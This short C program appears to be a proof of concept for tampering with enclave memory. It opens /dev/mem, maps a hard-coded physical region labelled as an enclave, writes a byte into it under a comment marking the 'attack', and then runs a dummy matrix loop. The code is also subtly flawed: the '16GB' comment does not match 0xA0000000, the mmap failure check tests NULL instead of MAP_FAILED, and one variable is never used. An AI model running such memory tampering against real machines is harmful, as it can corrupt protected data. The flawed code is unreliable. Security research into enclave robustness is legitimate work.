#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int Ma[32][32];
int Mb[32][32];
int Mc[32][32];

int main(){


    // fprintf(gnulinePipe,"plot '-' with lines lt -1\n");
    //// begin attac    
    //the last arg is aligned to 4KiB
    u_int64_t ENCLAVE_STARTADDR = 0x3d077a000;
    u_int64_t ENCLAVE_SIZE=0xA0000000; // 16GB
    unsigned int ENCLAVE_end=(ENCLAVE_SIZE-64)/8;
    int fp0=open("/dev/mem",O_RDWR|O_SYNC);
    void* vmem=mmap(NULL,ENCLAVE_SIZE,PROT_READ|PROT_WRITE,MAP_SHARED,fp0,ENCLAVE_STARTADDR);
    if (vmem==NULL)
    {
        printf("Can not map the region\n");
        exit(0);
    }
    char* ch = (char*)vmem;
    ch[0] = 0x1;
    for(int i=0;i<32;i++)
    {
        for(int j=0;j<32;j++)
        {
            Mc[i][j] = Ma[i][j]*Mb[j][i];
        }
    }
    exit(0);
    return 0;
}

